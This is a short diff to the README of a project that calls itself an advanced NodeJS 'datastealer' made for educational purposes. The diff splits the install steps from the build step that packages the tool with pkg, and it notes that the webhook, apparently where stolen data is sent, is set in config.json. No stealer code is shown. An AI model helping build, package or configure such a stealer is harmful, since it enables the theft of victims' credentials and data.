@@ -6,13 +6,18 @@ Advanced **datastealer** coded on NodeJS for educational purposes.
 
 * [Node.js](https://nodejs.org/)
 
-## Install and Usage
+## Install
 
+Installing:
 ```bash
 npm install
 npm i pkg
+```
+Building:
+```bash
 pkg config.json
 ```
+
 In order to modify the webhook, change it in config.json file
 
 ## Contributing
